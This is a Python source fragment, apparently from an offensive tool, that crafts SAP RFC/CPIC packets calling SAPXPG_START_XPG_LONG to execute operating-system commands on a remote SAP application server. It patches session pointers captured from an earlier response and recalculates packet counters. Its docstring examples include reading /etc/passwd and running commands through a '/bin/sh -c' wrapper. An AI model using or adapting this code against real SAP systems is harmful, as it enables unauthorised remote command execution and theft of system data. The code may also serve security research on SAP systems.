def _adjust_q_marker(pkt, offset, delta):
    """Adjust a Q marker (0x51 + 16-bit LE value) at the given offset."""
    assert pkt[offset] == 0x51, f"Expected Q marker at {offset}, got 0x{pkt[offset]:02x}"
    old_val = pkt[offset + 1] | (pkt[offset + 2] << 8)
    new_val = old_val + delta
    pkt[offset + 1] = new_val & 0xFF
    pkt[offset + 2] = (new_val >> 8) & 0xFF


def build_sap_send_start(conv_id, cmd_str, pte, sid='A4H', appserver='vhcala4hci'):
    """Build P3: F_SAP_SEND START / SAPXPG_START_XPG_LONG.

    Selects template based on command structure:
    - Single word, <= 6 chars, no args: NOARGS template (zero packet-size delta)
    - All other cases (program > 6 chars, has args, or full paths): ARGS template
      with dynamic RFC counter patching; supports program names up to 255 bytes
      and argument strings up to 255 bytes.

    Both templates share the same byte5/byte77 capability flags (patched at
    module init) so P2, P3, and P4 are always consistent.

    pte       -- 16-byte session pointer extracted from the P2 response.
    sid       -- SAP System ID of the target (3 chars, default 'A4H').
    appserver -- Application server hostname used for TH routing
                 (default 'vhcala4hci').  The TH routing string becomes
                 '{sid}/{appserver}_{sid}_00', space-padded to 32 bytes.

    Command examples (all supported):
      'whoami'                           → NOARGS  (6 chars, no args)
      'hostname'                         → ARGS    (8 chars, no args)
      'cat /etc/passwd'                  → ARGS    (cmd=cat, args=/etc/passwd)
      '/usr/sap/S4H/exe/dpmon'          → ARGS    (full path, no args)
      '/bin/sh -c "id; uname -a"'       → ARGS    (shell wrapper with args)
    """
    parts = cmd_str.split(' ', 1)
    program = parts[0]
    args = parts[1] if len(parts) > 1 else ''

    if not args and len(program) <= 6:
        return _build_p3_noargs(conv_id, program, pte, sid=sid, appserver=appserver)
    else:
        return _build_p3_args(conv_id, program, args, pte, sid=sid, appserver=appserver)


def _build_p3_noargs(conv_id, program, pte, sid='A4H', appserver='vhcala4hci'):
    """Build P3 using the NOARGS template (whoami, 6-byte cmd field).

    Space-pads the command to 6 bytes to maintain delta=0.
    Patches the session PTE so the server can locate the conversation.
    """
    pkt = bytearray(P3_TEMPLATE_NOARGS)

    # Conv_id at offset 40-47
    pkt[40:48] = conv_id.encode()[:8].ljust(8, b'\x00')

    # Patch session PTEs (main FUNC_PARAM 0x136 PTE + TH header PTE)
    pkt = bytearray(bytes(pkt).replace(_NOARGS_MAIN_PTE, pte))
    pkt = bytearray(bytes(pkt).replace(_NOARGS_TH_PTE, _compute_th_pte(pte)))
    # Patch remaining variant PTEs (cc8b/cc90 subtypes share the same IP tail)
    pkt = bytearray(bytes(pkt).replace(_PTE_IP_SUFFIX_OLD,
                                       bytes.fromhex('e1000000') + pte[12:16]))

    # Find TABLE_LINE and replace command data (space-padded to 6 bytes)
    tl_idx = bytes(pkt).find(b'TABLE_LINE')
    cmd_data_off = tl_idx + 13  # after TABLE_LINE(10) + type(1) + len(1) + flag(1)
    new_cmd = program.encode('ascii').ljust(6, b' ')  # pad to 6 bytes
    pkt[cmd_data_off:cmd_data_off + 6] = new_cmd

    # Patch TH routing and connection-info SID
    pkt = _patch_p3_routing(pkt, sid, appserver)

    return bytes(pkt)


def _build_p3_args(conv_id, program, args, pte, sid='A4H', appserver='vhcala4hci'):
    """Build P3 using the ARGS template (cat /etc/passwd, cmd=3, args=11).

    Handles arbitrary command and argument lengths by adjusting all
    RFC serialization counters identified through pcap comparison.

    Counter map (absolute offsets in the 1885-byte template):
    - Serialization header size: 2-byte BE @ 1267-1268
    - Serialization sub-sizes: bytes @ 1284, 1288
    - f8 block size: byte @ 1414
    - Command length: byte @ 1449
    - Gap Q markers (cmd_delta): @ 1454, 1480
    - Gap byte counters (cmd_delta): @ 1462, 1476, 1484, 1491
    - Args running counter: byte @ 1493 (+=args_delta*16)
    - Args length: byte @ 1494
    - Post-args Q markers (total_delta): @ 1507, 1547, 1593
    - Post-args byte counters (total_delta): @ 1551, 1565, 1572, 1582
    - Post-args byte counters (args_delta): @ 1515, 1541
    - CPIC header size: 4-byte BE @ 48-51
    - CPIC trailer size: 4-byte BE @ end-8
    """
    # Template constants
    TMPL_CMD_LEN = 3     # "cat"
    TMPL_ARGS_LEN = 11   # "/etc/passwd"
    CMD_DATA_OFF = 1451  # start of cmd data in template
    ARGS_DATA_OFF = 1496 # start of args data in template
    CMD_END = CMD_DATA_OFF + TMPL_CMD_LEN   # 1454
    ARGS_END = ARGS_DATA_OFF + TMPL_ARGS_LEN  # 1507

    pkt = bytearray(P3_TEMPLATE_ARGS)

    # Conv_id at offset 40-47
    pkt[40:48] = conv_id.encode()[:8].ljust(8, b'\x00')

    # Patch session PTEs (main FUNC_PARAM 0x136 PTE + TH header PTE)
    pkt = bytearray(bytes(pkt).replace(_ARGS_MAIN_PTE, pte))
    pkt = bytearray(bytes(pkt).replace(_ARGS_TH_PTE, _compute_th_pte(pte)))
    # Patch remaining variant PTEs (cc8b/cc90 subtypes share the same IP tail)
    pkt = bytearray(bytes(pkt).replace(_PTE_IP_SUFFIX_OLD,
                                       bytes.fromhex('e1000000') + pte[12:16]))

    new_cmd = program.encode('ascii')
    new_args = args.encode('ascii')
    new_cmd_len = len(new_cmd)
    new_args_len = len(new_args)

    if new_cmd_len > 255:
        raise ValueError(f'Program name too long ({new_cmd_len} bytes, max 255)')
    if new_args_len > 255:
        raise ValueError(f'Argument string too long ({new_args_len} bytes, max 255)')

    cmd_delta = new_cmd_len - TMPL_CMD_LEN
    args_delta = new_args_len - TMPL_ARGS_LEN
    total_delta = cmd_delta + args_delta

    # === Step 1: Adjust all counter VALUES at original template offsets ===
    # (before any data insertion/deletion)

    if total_delta != 0:
        # CPIC header size (4-byte BE)
        old_cpic = struct.unpack('>I', pkt[48:52])[0]
        struct.pack_into('>I', pkt, 48, old_cpic + total_delta)

        # Serialization header size (2-byte BE)
        old_ser = struct.unpack('>H', pkt[1267:1269])[0]
        struct.pack_into('>H', pkt, 1267, old_ser + total_delta)

        # Serialization sub-size bytes
        pkt[1284] = (pkt[1284] + total_delta) & 0xFF
        pkt[1288] = (pkt[1288] + total_delta) & 0xFF

    if cmd_delta != 0:
        # f8 block size (22 + cmd_len)
        pkt[1414] = (pkt[1414] + cmd_delta) & 0xFF

        # Gap Q markers (track cmd_delta)
        _adjust_q_marker(pkt, 1454, cmd_delta)  # cmd_end+0
        _adjust_q_marker(pkt, 1480, cmd_delta)  # cmd_end+26

        # Gap byte counters (track cmd_delta)
        for off in [1462, 1476, 1484, 1491]:
            pkt[off] = (pkt[off] + cmd_delta) & 0xFF

    if args_delta != 0:
        # Bytes [1492:1494) form a 2-byte BE size field.  The args_delta*16
        # adjustment can overflow a single byte when args grow by 2+ bytes
        # (base 0xe7=231, only 1 unit headroom in the low byte).
        # Propagate carry to the high byte at 1492.
        old_val = (pkt[1492] << 8) | pkt[1493]
        new_val = old_val + args_delta * 16
        pkt[1492] = (new_val >> 8) & 0xFF
        pkt[1493] = new_val & 0xFF

        # Post-args byte counters tracking args_delta
        for off in [1515, 1541]:
            pkt[off] = (pkt[off] + args_delta) & 0xFF

    if total_delta != 0:
        # Post-args Q markers (track total_delta)
        _adjust_q_marker(pkt, 1507, total_delta)  # args_end+0
        _adjust_q_marker(pkt, 1547, total_delta)  # args_end+40
        _adjust_q_marker(pkt, 1593, total_delta)  # args_end+86

        # Post-args byte counters tracking total_delta
        for off in [1551, 1565, 1572, 1582]:
            pkt[off] = (pkt[off] + total_delta) & 0xFF

    # Command length byte
    pkt[1449] = new_cmd_len

    # Args length byte
    pkt[1494] = new_args_len

    # === Step 2: Replace data (cmd first, then args at shifted offset) ===
    pkt = pkt[:CMD_DATA_OFF] + new_cmd + pkt[CMD_DATA_OFF + TMPL_CMD_LEN:]

    # Args offset shifted by cmd_delta
    new_args_off = ARGS_DATA_OFF + cmd_delta
    pkt = pkt[:new_args_off] + new_args + pkt[new_args_off + TMPL_ARGS_LEN:]

    # === Step 3: CPIC trailer size (at new end position) ===
    old_cpic = struct.unpack('>I', P3_TEMPLATE_ARGS[48:52])[0]
    struct.pack_into('>I', pkt, len(pkt) - 8, old_cpic + total_delta)

    # Patch TH routing and connection-info SID (always length-neutral)
    pkt = _patch_p3_routing(pkt, sid, appserver)

    return bytes(pkt)


